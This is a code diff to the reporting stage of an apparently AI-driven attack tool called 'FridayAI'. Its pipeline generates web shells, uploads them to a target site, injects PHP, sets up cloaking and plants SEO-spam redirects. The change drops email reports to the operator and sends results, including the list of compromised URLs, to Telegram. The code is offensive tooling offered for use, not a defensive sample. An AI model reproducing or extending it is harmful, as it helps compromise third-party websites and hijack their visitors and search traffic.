@@ -1671,72 +1671,7 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
-  // ─── Email Notification (primary) + Telegram (backup) ───
-  try {
-    // For email: show real deployed URLs, not target URL from shellless
-    const deployedUrls = uploadedFiles
-      .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
-      .map(f => f.method.startsWith("shellless_") ? `${f.url} (via ${f.method})` : f.url);
-    const shelllessSuccessCount = shelllessResults.filter(r => r.success).length;
-    const hasRealFileSuccess = realVerifiedFiles.length > 0;
-    const statusEmoji = hasRealFileSuccess ? "✅" : (success ? "⚠️" : (shelllessSuccessCount > 0 ? "⚠️" : "❌"));
-    const statusText = hasRealFileSuccess ? "SUCCESS" : (success ? "PARTIAL (shellless redirect confirmed)" : (shelllessSuccessCount > 0 ? "PARTIAL (shellless, redirect unconfirmed)" : "FAILED"));
-
-    // Build email body
-    const emailSubject = `${statusEmoji} FridayAI Attack Report: ${config.targetUrl} — ${statusText}`;
-    const emailBody = [
-      `# FridayAI Attack Report`,
-      ``,
-      `**Target:** ${config.targetUrl}`,
-      `**Redirect:** ${config.redirectUrl}`,
-      `**Status:** ${statusText}`,
-      `**Duration:** ${Math.round(result.totalDuration / 1000)}s`,
-      `**Keywords:** ${config.seoKeywords.join(", ")}`,
-      ``,
-      `## Results`,
-      `- Shells Generated: ${shells.length}`,
-      `- Upload Attempts: ${totalAttempts}`,
-      `- Files Deployed: ${uploadedFiles.length}`,
-      `- Verified: ${verifiedFiles.length}`,
-      `- Redirects Working: ${redirectWorkingFiles.length}`,
-      shelllessResults.length > 0 ? `- Shellless Methods: ${shelllessSuccessCount}/${shelllessResults.length} succeeded` : "",
-      injectionResult ? `- PHP Injected: ${injectionResult.injectedFiles?.length || 0} files` : "",
-      cloakingResult ? `- Cloaking: ${cloakingResult.type}` : "",
-      ``,
-      deployedUrls.length > 0 ? `## Deployed URLs\n${deployedUrls.map(u => `- ${u}`).join("\n")}` : "",
-      shelllessResults.filter(r => r.success).length > 0 ? `## Shellless Successes\n${shelllessResults.filter(r => r.success).map(r => `- **${r.method}**: ${r.detail}${r.injectedUrl ? ` → ${r.injectedUrl}` : ""}`).join("\n")}` : "",
-      errors.length > 0 ? `## Errors (top 5)\n${errors.slice(0, 5).map(e => `- ${e}`).join("\n")}` : "",
-      ``,
-      `## AI Decisions`,
-      aiDecisions.map(d => `- ${d}`).join("\n"),
-    ].filter(Boolean).join("\n");
-
-    // Send via notifyOwner (email)
-    const { notifyOwner } = await import("./_core/notification");
-    const emailResult = await notifyOwner({
-      title: emailSubject,
-      content: emailBody,
-    });
-    result.emailSent = emailResult;
-
-    if (emailResult) {
-      onEvent({
-        phase: "complete",
-        step: "email",
-        detail: `📧 Email แจ้งเตือนแล้ว`,
-        progress: 100,
-      });
-    }
-  } catch (emailErr: any) {
-    onEvent({
-      phase: "complete",
-      step: "email",
-      detail: `⚠️ Email ส่งไม่ได้: ${emailErr.message}`,
-      progress: 100,
-    });
-  }
-
-  // Telegram as backup
+  // ─── Telegram Notification (primary — no email) ───
   try {
     // Only show URLs that are actual deployed files (not target URL from shellless)
     const realDeployedUrls = uploadedFiles
@@ -1769,7 +1704,31 @@ export async function runUnifiedAttackPipeline(
 
     const telegramResult = await sendTelegramNotification(telegramPayload);
     result.telegramSent = telegramResult.success;
-  } catch { /* Telegram is backup, ignore errors */ }
+    result.emailSent = false; // Email disabled — Telegram only
+
+    if (telegramResult.success) {
+      onEvent({
+        phase: "complete",
+        step: "telegram",
+        detail: `📱 Telegram แจ้งเตือนแล้ว`,
+        progress: 100,
+      });
+    } else {
+      onEvent({
+        phase: "complete",
+        step: "telegram",
+        detail: `⚠️ Telegram ส่งไม่ได้`,
+        progress: 100,
+      });
+    }
+  } catch (telegramErr: any) {
+    onEvent({
+      phase: "complete",
+      step: "telegram",
+      detail: `⚠️ Telegram ส่งไม่ได้: ${telegramErr.message}`,
+      progress: 100,
+    });
+  }
 
   return result;
 }
